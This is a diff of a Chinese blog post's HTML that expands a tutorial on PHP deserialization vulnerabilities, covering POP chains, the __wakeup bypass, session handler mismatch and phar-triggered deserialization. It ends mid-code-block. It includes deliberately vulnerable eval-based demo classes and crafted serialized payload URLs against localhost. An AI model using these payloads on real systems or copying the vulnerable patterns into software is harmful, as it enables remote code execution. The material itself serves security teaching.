@@ -19,15 +19,15 @@
         <meta name="keywords" content="hexo,hexo-theme,hexo-blog">
     
     <meta name="description" content="">
-    <meta name="description" content="PHP中的反序列化漏洞 前言： 原理： 序列化: 反序列化存在的问题     PHP中的反序列化漏洞前言：好长时间没做php反序列化问题，都快忘了，总结一下防止忘记。 原理：php允许保存一个对象方便以后重用，这个过程被称为序列化. 序列化：把复杂的数据类型压缩到一个字符串中 数据类型可以是数组，字符串，对象等  函数 : serialize() 反序列化：恢复原先被序列化的变量 函数: u">
+    <meta name="description" content="PHP反序列化漏洞 原理 反序列化POP链 绕过魔法方法的反序列化漏洞CVE-2016-7124   PHP SESSION反序列化 简介与基础知识 漏洞危害 漏洞利用 实际利用     phar伪协议触发php反序列化  - 漏洞利用条件 基础知识 访问控制修饰符 php序列化 php反序列化   Reference    PHP反序列化漏洞原理 原理：未对用户输入的序列化字符串进行检测，">
 <meta property="og:type" content="article">
-<meta property="og:title" content="反序列化漏洞">
-<meta property="og:url" content="https://yinwc.github.io/2018/06/03/phpmagic/index.html">
+<meta property="og:title" content="PHP反序列化漏洞">
+<meta property="og:url" content="https://yinwc.github.io/2018/06/03/php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/index.html">
 <meta property="og:site_name" content="Hexo">
-<meta property="og:description" content="PHP中的反序列化漏洞 前言： 原理： 序列化: 反序列化存在的问题     PHP中的反序列化漏洞前言：好长时间没做php反序列化问题，都快忘了，总结一下防止忘记。 原理：php允许保存一个对象方便以后重用，这个过程被称为序列化. 序列化：把复杂的数据类型压缩到一个字符串中 数据类型可以是数组，字符串，对象等  函数 : serialize() 反序列化：恢复原先被序列化的变量 函数: u">
+<meta property="og:description" content="PHP反序列化漏洞 原理 反序列化POP链 绕过魔法方法的反序列化漏洞CVE-2016-7124   PHP SESSION反序列化 简介与基础知识 漏洞危害 漏洞利用 实际利用     phar伪协议触发php反序列化  - 漏洞利用条件 基础知识 访问控制修饰符 php序列化 php反序列化   Reference    PHP反序列化漏洞原理 原理：未对用户输入的序列化字符串进行检测，">
 <meta property="og:locale" content="en_US">
 <meta property="article:published_time" content="2018-06-03T07:46:59.000Z">
-<meta property="article:modified_time" content="2023-01-28T07:30:51.780Z">
+<meta property="article:modified_time" content="2023-03-06T08:03:28.480Z">
 <meta property="article:author" content="Y1ZkRA">
 <meta property="article:tag" content="漏洞">
 <meta name="twitter:card" content="summary">
@@ -35,7 +35,7 @@
     <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1">
     <link rel="icon" href="/assets/ywc.ico">
     
-    <title>反序列化漏洞 · Ywc&#39;s blog</title>
+    <title>PHP反序列化漏洞 · Ywc&#39;s blog</title>
     <!-- /*! loadCSS. [c]2017 Filament Group, Inc. MIT License */
 /* This file is meant as a standalone workflow for
 - testing support for link[rel=preload]
@@ -261,7 +261,7 @@
                 <a href="/">Ywc&#39;s blog</a>
             </div>
             <div class="post-title header-element">
-                <a href="#" class="post-name">反序列化漏洞</a>
+                <a href="#" class="post-name">PHP反序列化漏洞</a>
             </div>
         </div>
     
@@ -307,7 +307,7 @@
         <h1 class="intro-title">
             <!-- 主页  -->
             
-                反序列化漏洞
+                PHP反序列化漏洞
             <!-- 404 -->
             
         </h1>
@@ -335,7 +335,7 @@
                 <!-- 文章字数统计 -->
                 
                     <div class="post-intro-read">
-                        <span>Word count: <span class="post-count word-count">748</span>Reading time: <span class="post-count reading-time">3 min</span></span>
+                        <span>Word count: <span class="post-count word-count">4.5k</span>Reading time: <span class="post-count reading-time">18 min</span></span>
                     </div>
                 
                 <div class="post-intro-meta">
@@ -499,34 +499,204 @@
         <!-- TOC -->
 
 <ul>
-<li><a href="#php%E4%B8%AD%E7%9A%84%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E">PHP中的反序列化漏洞</a><ul>
-<li><a href="#%E5%89%8D%E8%A8%80">前言：</a></li>
-<li><a href="#%E5%8E%9F%E7%90%86">原理：</a></li>
-<li><a href="#%E5%BA%8F%E5%88%97%E5%8C%96">序列化:</a></li>
-<li><a href="#%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%AD%98%E5%9C%A8%E7%9A%84%E9%97%AE%E9%A2%98">反序列化存在的问题</a></li>
+<li><a href="#php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E">PHP反序列化漏洞</a><ul>
+<li><a href="#%E5%8E%9F%E7%90%86">原理</a></li>
+<li><a href="#%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96pop%E9%93%BE">反序列化POP链</a></li>
+<li><a href="#%E7%BB%95%E8%BF%87%E9%AD%94%E6%B3%95%E6%96%B9%E6%B3%95%E7%9A%84%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9Ecve-2016-7124">绕过魔法方法的反序列化漏洞CVE-2016-7124</a></li>
+</ul>
+</li>
+<li><a href="#php-session%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96">PHP SESSION反序列化</a><ul>
+<li><a href="#%E7%AE%80%E4%BB%8B%E4%B8%8E%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86">简介与基础知识</a></li>
+<li><a href="#%E6%BC%8F%E6%B4%9E%E5%8D%B1%E5%AE%B3">漏洞危害</a></li>
+<li><a href="#%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8">漏洞利用</a><ul>
+<li><a href="#%E5%AE%9E%E9%99%85%E5%88%A9%E7%94%A8">实际利用</a></li>
 </ul>
 </li>
 </ul>
+</li>
+<li><a href="#phar%E4%BC%AA%E5%8D%8F%E8%AE%AE%E8%A7%A6%E5%8F%91php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96">phar伪协议触发php反序列化</a><br>  - <a href="#%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%E6%9D%A1%E4%BB%B6">漏洞利用条件</a></li>
+<li><a href="#%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86">基础知识</a><ul>
+<li><a href="#%E8%AE%BF%E9%97%AE%E6%8E%A7%E5%88%B6%E4%BF%AE%E9%A5%B0%E7%AC%A6">访问控制修饰符</a></li>
+<li><a href="#php%E5%BA%8F%E5%88%97%E5%8C%96">php序列化</a></li>
+<li><a href="#php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96">php反序列化</a></li>
+</ul>
+</li>
+<li><a href="#reference">Reference</a></li>
+</ul>
 <!-- /TOC -->
-<h1 id="PHP中的反序列化漏洞"><a href="#PHP中的反序列化漏洞" class="headerlink" title="PHP中的反序列化漏洞"></a>PHP中的反序列化漏洞</h1><h2 id="前言："><a href="#前言：" class="headerlink" title="前言："></a>前言：</h2><p>好长时间没做php反序列化问题，都快忘了，总结一下防止忘记。</p>
-<h2 id="原理："><a href="#原理：" class="headerlink" title="原理："></a>原理：</h2><p>php允许保存一个对象方便以后重用，这个过程被称为序列化.</p>
-<p>序列化：把复杂的数据类型压缩到一个字符串中 数据类型可以是数组，字符串，对象等  函数 : serialize()</p>
-<p>反序列化：恢复原先被序列化的变量 函数: unserialize()</p>
-<h2 id="序列化"><a href="#序列化" class="headerlink" title="序列化:"></a>序列化:</h2><p>eg:</p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$test1</span> = <span class="string">&quot;hello world&quot;</span></span><br><span class="line"><span class="variable">$test2</span> = <span class="keyword">array</span>(<span class="string">&quot;hello&quot;</span>,<span class="string">&quot;world&quot;</span>);</span><br><span class="line"><span class="variable">$test3</span> = <span class="number">123456</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">serialize</span>(<span class="variable">$test1</span>); <span class="comment">//  s:11:&quot;hello world&quot;;  序列化字符串</span></span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">serialize</span>(<span class="variable">$test2</span>); <span class="comment">// a:2:&#123;i:0;s:5:&quot;hello&quot;;i:1;s:5:&quot;world&quot;;&#125; 序列化数组</span></span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">serialize</span>(<span class="variable">$test3</span>); <span class="comment">//  i:123456;</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">hello</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$test</span> = <span class="string">&quot;hello,world&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$test</span> = <span class="keyword">new</span> <span class="title function_ invoke__">hello</span>();</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">serialize</span>(<span class="variable">$test</span>);  <span class="comment">//  O:5:&quot;hello&quot;:1:&#123;s:5:&quot;test4&quot;;s:11:&quot;hello,world&quot;;</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
-<p>序列化对象时，首字母代表参数类型。</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">a – array 数组</span><br><span class="line">b – boolean布尔型</span><br><span class="line">d – double双精度型</span><br><span class="line">i – integer(int)</span><br><span class="line">o – common object一般对象</span><br><span class="line">r – reference</span><br><span class="line">s – string</span><br><span class="line">C – custom object 自定义对象</span><br><span class="line">O – class</span><br><span class="line">N – null</span><br><span class="line">R – pointer reference</span><br><span class="line">U – unicode string unicode编码的字符串</span><br></pre></td></tr></table></figure>
-<p>参数后面的数字代表参数的长度。</p>
-<p>序列化字符串格式： 变量类型：变量长度：变量内容</p>
-<p>如果序列化的是一个对象，序列化字符串格式为：</p>
-<p>变量类型：类名长度：类名：属性数量：｛属性类型：属性名长度：属性名；属性值类型：属性值长度：属性值内容｝</p>
-<p>如上面的O:5:”hello”:1:{s:5:”test4”;s:11:”hello,world”.</p>
-<h2 id="反序列化存在的问题"><a href="#反序列化存在的问题" class="headerlink" title="反序列化存在的问题"></a>反序列化存在的问题</h2><p><a target="_blank" rel="noopener" href="http://php.net/manual/zh/language.oop5.magic.php">魔术方法：官方文档中介绍</a></p>
-<p><font color="blue">__construct()， __destruct()， __call()， __callStatic()， __get()， __set()， __isset()， __unset()，<br>__sleep()， __wakeup()， __toString()， __invoke()， __set_state()， __clone() 和 __debugInfo() </font>等方法在 PHP 中被称为”魔术方法”（Magic methods）。在命名自己的类方法时不能使用这些方法名，除非是想使用其魔术功能。 </p>
-<p>问题原因：漏洞的根源在于unserialize()函数的参数可控。如果反序列化对象中存在魔术方法，而且魔术方法中的代码或变量用户可控，就可能产生反序列化漏洞，根据反序列化后不同的代码可以导致各种攻击，如代码注入、SQL注入、目录遍历等等。</p>
-<p>反序列化漏洞中常见到有一些魔术方法：**__construct()**：在对象创建时自动被调用； **__destruct()<strong>：在脚本运行结束时自动被调用；</strong>__sleep()<strong>：在对象序列化的时候自动被调用；</strong>__wakeup()<strong>：在反序列化为对象时自动被调用；</strong>__toString()**： 直接输出对象引用时自动被调用；</p>
-<p>魔术方法的使用方法及案列详见<a target="_blank" rel="noopener" href="http://php.net/manual/zh/language.oop5.magic.php">官方文档介绍</a></p>
-<p>参考链接：</p>
+
+<h2 id="PHP反序列化漏洞"><a href="#PHP反序列化漏洞" class="headerlink" title="PHP反序列化漏洞"></a>PHP反序列化漏洞</h2><h3 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h3><ul>
+<li><p>原理：未对用户输入的序列化字符串进行检测，导致攻击者可以控制反序列化过程，从而导致代码执行，SQL注入，目录遍历等不可控后果。</p>
+<ul>
+<li>反序列化的过程中自动触发了某些魔术方法。在反序列化时，如果反序列化对象中存在魔法函数，使用unserialize()函数同时也会触发。这样，一旦我们能够控制unserialize()入口，那么就可能引发对象注入漏洞。</li>
+<li>序列化：将一个对象转换成字符串。把复杂的数据类型压缩到一个字符串中 数据类型可以是数组，字符串，对象等  函数 : <code>serialize()</code></li>
+<li>反序列化：恢复原先被序列化的变量。函数: <code>unserialize()</code></li>
+</ul>
+</li>
+<li><p>漏洞触发条件： <code>unserialize</code>函数的参数、变量可控，php文件中存在可利用的类，类中有魔术方法。</p>
+</li>
+<li><p>魔术方法：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">__construct() 当对象创建（new）时会自动调用。但在 unserialize() 时是不会自动调用的。</span><br><span class="line">__destruct() 当一个对象销毁（反序列化）时被调用</span><br><span class="line">__toString() 当一个对象被当作一个字符串使用时被调用</span><br><span class="line">__sleep() 在对象在被序列化之前立即运行</span><br><span class="line">__wakeup() 将在序列化之后立即被调用</span><br><span class="line">__call()， __callStatic()， __get()， __set()， __isset()， __unset()， __toString()， __invoke()， __set_state()， __clone() 和 __debugInfo()</span><br></pre></td></tr></table></figure></li>
+</ul>
+<h3 id="反序列化POP链"><a href="#反序列化POP链" class="headerlink" title="反序列化POP链"></a>反序列化POP链</h3><ul>
+<li><code>unserialize()</code>反序列化函数用于将单一的已序列化的变量转换回 PHP 的值。</li>
+<li>当反序列化参数可控时，可能会产生PHP反序列化漏洞。</li>
+<li>在反序列化中，我们所能控制的数据就是对象中的各个属性值，所以在PHP的反序列化中有一种漏洞利用方法叫做 “面向属性编程”，面向对象编程从一定程度上来说，就是完成类与类之间的调用。POP链起于一些小的“组件”，这些小“组件”可以调用其他的“组件”</li>
+<li>在PHP中，“组件”就是那些魔术方法（如：wakeup()或destruct）</li>
+</ul>
+<p>面向属性编程（Property-Oriented Programing）常用于上层语言构造特定调用链的方法，与二进制利用中的面向返回编程（Return-Oriented Programing）的原理相似，都是从现有运行环境中寻找一系列的代码或者指令调用，然后根据需求构成一组连续的调用链。在控制代码或者程序的执行流程后就能够使用这一组调用链做一些工作了。</p>
+<h3 id="绕过魔法方法的反序列化漏洞-CVE-2016-7124"><a href="#绕过魔法方法的反序列化漏洞-CVE-2016-7124" class="headerlink" title="绕过魔法方法的反序列化漏洞(CVE-2016-7124)"></a>绕过魔法方法的反序列化漏洞(CVE-2016-7124)</h3><p>绕过魔术方法 <code>__wakeup</code>: 当序列化字符串中表示<strong>对象属性个数的数字值</strong>大于<strong>真实类中属性的个数</strong>时就会跳过<code>__wakeup</code>的执行。</p>
+<blockquote>
+<p>unserialize() 执行时会检查是否存在一个 wakeup() 方法。 如果存在，则会先调用 wakeup方法，预先准备对象需要的资源。<br>wakeup()经常用在反序列化操作中，例如重新建立数据库连接，或执行其它初始化操作。<br>sleep()则相反，是用在序列化一个对象时被调用.</p>
+</blockquote>
+<h2 id="PHP-SESSION反序列化"><a href="#PHP-SESSION反序列化" class="headerlink" title="PHP SESSION反序列化"></a>PHP SESSION反序列化</h2><h3 id="简介与基础知识"><a href="#简介与基础知识" class="headerlink" title="简介与基础知识"></a>简介与基础知识</h3><p>在php.ini中存在三项配置项：</p>
+<ul>
+<li><code>session.save_path=&quot;&quot;</code> –设置session的存储路径</li>
+<li><code>session.save_handler=&quot;&quot;</code> –<strong>设定用户自定义session存储函数，如果想使用PHP内置会话存储机制之外的可以使用本函数(数据库等方式)</strong></li>
+<li><code>session.auto_start boolen</code> –指定会话模块是否在请求开始时启动一个会话，默认为0不启动</li>
+<li><code>session.serialize_handler string</code> –<strong>定义用来序列化&#x2F;反序列化的处理器名字。默认使用php (php&lt;5.5.4)</strong></li>
+</ul>
+<p>以上的选项就是与PHP中的Session 存储 和 序列化存储 有关的选项。</p>
+<p>在使用<strong>xampp</strong>组件安装中，上述的配置项的设置如下：</p>
+<ul>
+<li><code>session.save_path=&quot;D:\xampp\tmp&quot;</code> 表明所有的session文件都是存储在xampp&#x2F;tmp下</li>
+<li><code>session.save_handler=files</code> 表明session是以文件的方式来进行存储的</li>
+<li><code>session.auto_start=0</code> 表明默认不启动session</li>
+<li><code>session.serialize_handler=php</code> <strong>表明session的默认序列化引擎使用的是php序列话引擎</strong></li>
+</ul>
+<p><strong>在上述的配置中，session.serialize_handler是用来设置session的序列化引擎的，除了默认的PHP引擎之外，还存在其他引擎，不同的引擎所对应的session的存储方式不相同。</strong></p>
+<table>
+<thead>
+<tr>
+<th align="left">引擎</th>
+<th align="left">session存储方式</th>
+</tr>
+</thead>
+<tbody><tr>
+<td align="left">php(php&lt;5.5.4)</td>
+<td align="left">存储方式是，键名+竖线&#96;</td>
+</tr>
+<tr>
+<td align="left">php_serialize(php&gt;5.5.4)</td>
+<td align="left">存储方式是，经过serialize()函数序列化处理的键和值（将session中的key和value都会进行序列化）</td>
+</tr>
+<tr>
+<td align="left">php_binary</td>
+<td align="left">存储方式是，键名的长度对应的ASCII字符+键名+经过serialize()函数序列化处理的值</td>
+</tr>
+</tbody></table>
+<p>在PHP (php&lt;5.5.4) 中默认使用的是PHP引擎，如果要修改为其他的引擎，只需要添加代码<code>ini_set(&#39;session.serialize_handler&#39;, &#39;需要设置的引擎名&#39;);</code>进行设置。</p>
+<p>示例代码如下：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">ini_set(&#x27;session.serialize_handler&#x27;, &#x27;php_serialize&#x27;); //设置序列化引擎使用php_serialize </span><br><span class="line">session_start(); </span><br><span class="line">// do something ......</span><br></pre></td></tr></table></figure>
+
+<p><strong>存储机制</strong></p>
+<p><strong>php中的session中的内容并不是放在内存中的，而是以文件的方式来存储的，存储方式就是由配置项session.save_handler来进行确定的，默认是以文件的方式存储。<br>存储的文件是以sess_sessionid(PHPSESSID)来进行命名的，文件的内容就是session值经过serialize()函数序列化之后的内容。</strong><br>假设我们的环境是xampp，那么默认配置如上所述。</p>
+<h3 id="漏洞危害"><a href="#漏洞危害" class="headerlink" title="漏洞危害"></a>漏洞危害</h3><p>PHP中的Session的实现是没有的问题的，危害主要是由于程序员的Session使用不当而引起的。<br><strong>如果设置的session序列化选择器与默认的不同的话就可能会产生漏洞（会导致数据无法正确的反序列化）。</strong>通过精心构造的数据包，就可以绕过程序的验证或者是执行一些系统的方法。例如:</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$_SESSION</span>[<span class="string">&#x27;spoock&#x27;</span>] = <span class="string">&#x27;|O:11:&quot;PeopleClass&quot;:0:&#123;&#125;&#x27;</span>;</span><br></pre></td></tr></table></figure>
+
+<p>上述的$_SESSION的数据如果使用php_serialize，那么最后的存储的内容就是<code>a:1:&#123;s:6:&quot;spoock&quot;;s:24:&quot;|O:11:&quot;PeopleClass&quot;:0:&#123;&#125;&quot;;&#125;</code> 。</p>
+<p>但是我们在进行读取的时候，如果选择的是php，那么最后读取的内容是：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">array</span> (size=<span class="number">1</span>)</span><br><span class="line"> <span class="string">&#x27;a:1:&#123;s:6:&quot;spoock&quot;;s:24:&quot;&#x27;</span> =&gt; </span><br><span class="line"> <span class="keyword">object</span>(<span class="built_in">__PHP_Incomplete_Class</span>)[<span class="number">1</span>]</span><br><span class="line"> <span class="keyword">public</span> <span class="string">&#x27;__PHP_Incomplete_Class_Name&#x27;</span> =&gt; <span class="keyword">string</span> <span class="string">&#x27;PeopleClass&#x27;</span> (length=<span class="number">11</span>)</span><br></pre></td></tr></table></figure>
+
+<p>这是因为当使用php引擎的时候，php引擎会以竖杠 | 作为作为key(键)和value(值)的分隔符，那么就会将a:1:{s:6:“spoock”;s:24:”作为SESSION的key(键)，将O:11:“PeopleClass”:0:{}作为value(值)，然后进行反序列化，最后就会得到PeopleClas这个类。</p>
+<p><strong>这种由于序列化和反序列化所使用的不一样的引擎就是造成PHP Session序列话漏洞的原因。</strong></p>
+<h3 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">syclover</span></span>&#123;</span><br><span class="line"> <span class="keyword">var</span> <span class="variable">$func</span>=<span class="string">&quot;&quot;</span>;</span><br><span class="line"> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>) </span>&#123;     <span class="comment">// __construct()在实例化是被调用</span></span><br><span class="line">  <span class="variable language_">$this</span>-&gt;func = <span class="string">&quot;phpinfo()&quot;</span>;</span><br><span class="line"> &#125;</span><br><span class="line"> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">  <span class="keyword">eval</span>(<span class="variable language_">$this</span>-&gt;func);</span><br><span class="line"> &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="title function_ invoke__">unserialize</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;a&#x27;</span>]);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>在11行对传入的参数进行了反序列化。我们可以通过传入一个特定的字符串，反序列化为syclover的一个示例，那么就可以执行eval()方法。我们访问<code>localhost/test.php?a=O:8:&quot;syclover&quot;:1:&#123;s:4:&quot;func&quot;;s:14:&quot;echo &quot;spoock&quot;;&quot;;&#125;</code> 。<br>那么反序列化得到的内容是：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">object</span>(syclover)[<span class="number">1</span>]</span><br><span class="line"> <span class="keyword">public</span> <span class="string">&#x27;func&#x27;</span> =&gt; <span class="keyword">string</span> <span class="string">&#x27;echo &quot;spoock&quot;;&#x27;</span> (length=<span class="number">14</span>)</span><br></pre></td></tr></table></figure>
+
+<p><strong>最后页面输出的就是spoock，说明最后执行了我们定义的echo “spoock”;方法。</strong>这就是一个简单的序列化的漏洞的演示。</p>
+<h4 id="实际利用"><a href="#实际利用" class="headerlink" title="实际利用"></a>实际利用</h4><p><strong>存在s1.php和us2.php这两个文件，2个文件所使用的SESSION的引擎不一样，就形成了一个漏洞。</strong></p>
+<p>s1.php，使用php_serialize来处理session</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">ini_set</span>(<span class="string">&#x27;session.serialize_handler&#x27;</span>, <span class="string">&#x27;php_serialize&#x27;</span>);</span><br><span class="line"><span class="title function_ invoke__">session_start</span>();</span><br><span class="line"><span class="variable">$_SESSION</span>[<span class="string">&quot;spoock&quot;</span>]=<span class="variable">$_GET</span>[<span class="string">&quot;a&quot;</span>];</span><br></pre></td></tr></table></figure>
+
+<p>us2.php，使用php来处理session</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">ini_set</span>(<span class="string">&#x27;session.serialize_handler&#x27;</span>, <span class="string">&#x27;php&#x27;</span>);`localhost/s1.php?a=|O:<span class="number">5</span>:<span class="string">&quot;lemon&quot;</span>:<span class="number">1</span>:&#123;s:<span class="number">2</span>:<span class="string">&quot;hi&quot;</span>;s:<span class="number">14</span>:<span class="string">&quot;echo &quot;</span>spoock<span class="string">&quot;;&quot;</span>;&#125;`</span><br><span class="line"><span class="title function_ invoke__">session_start</span>();</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">lemon</span> </span>&#123;</span><br><span class="line"> <span class="keyword">var</span> <span class="variable">$hi</span>;</span><br><span class="line"> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line"> <span class="variable language_">$this</span>-&gt;hi = <span class="string">&#x27;phpinfo();&#x27;</span>;</span><br><span class="line"> &#125;</span><br><span class="line"></span><br><span class="line"> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">  <span class="keyword">eval</span>(<span class="variable language_">$this</span>-&gt;hi);</span><br><span class="line"> &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// O:5:&quot;lemon&quot;:1:&#123;s:2:&quot;hi&quot;;s:14:&quot;echo &quot;spoock&quot;;&quot;;&#125;</span></span><br></pre></td></tr></table></figure>
+
+<p>此题在s1.php中有可以传入session的点，所以就不用构造表单了，这题的突破点在哪里，没错，就是我备注的那块s2.php中<code>ini_set(&#39;session.serialize_handler&#39;, &#39;php&#39;);</code>，选择session序列化处理器。</p>
+<p>当访问s1.php时，提交如下的数据并存储到session文件中：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">localhost/s1.php?a=|O:<span class="number">5</span>:<span class="string">&quot;lemon&quot;</span>:<span class="number">1</span>:&#123;s:<span class="number">2</span>:<span class="string">&quot;hi&quot;</span>;s:<span class="number">14</span>:<span class="string">&quot;echo &quot;</span>spoock<span class="string">&quot;;&quot;</span>;&#125;</span><br></pre></td></tr></table></figure>
+
+<p>此时传入的数据会按照php_serialize来进行序列化，由s2.php读取时按照php来反序列化。</p>
+<p>O:5:“lemon”:1:{s:2:“hi”;s:14:“echo “spoock”;”;}由以下序列化来得到，在加上一个竖杠 |<br>就行了</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">lemon</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$hi</span>=<span class="string">&#x27;xxxxx&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$obj</span> = <span class="keyword">new</span> <span class="title function_ invoke__">lemon</span>();</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">serialize</span>(<span class="variable">$obj</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">xxxxx处按照你想执行的代码来填写，这里填的是<span class="keyword">echo</span> <span class="string">&quot;spoock</span></span><br></pre></td></tr></table></figure>
+
+<p><strong>此时访问us2.php时，页面输出，spoock成功执行了我们构造的函数。因为在访问us2.php时，程序会按照php来反序列化SESSION中的数据，此时就会反序列化伪造的数据，就会实例化lemon对象，最后就会执行析构函数中的eval()方法。</strong></p>
+<h2 id="phar伪协议触发php反序列化"><a href="#phar伪协议触发php反序列化" class="headerlink" title="phar伪协议触发php反序列化"></a>phar伪协议触发php反序列化</h2><ul>
+<li><p>phar文件会以序列化的形式存储用户自定义的meta-data，在一些文件操作函数执行的参数可控时，我们在参数部分利用Phar伪协议，可以不依赖unserialize() 直接进行反序列化操作，在读取phar文件里的数据时反序列化meta-data，达到我们的操控目的。</p>
+</li>
+<li><p>而在一些上传点，我们可以更改phar的文件头并且修改其后缀名绕过检测，如：test.gif，里面的meta-data却是我们提前写入的恶意代码，而且可利用的文件操作函数又很多，所以这是一种不错的绕过+执行的方法。</p>
+</li>
+<li><p>phar怎么用？<br>phar.php：</p>
+</li>
+</ul>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">TestObject</span></span>&#123;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$phar</span> = <span class="keyword">new</span> <span class="title class_">Phar</span>(<span class="string">&quot;phar.phar&quot;</span>);    <span class="comment">//实例一个phar对象供后续操作 </span></span><br><span class="line"><span 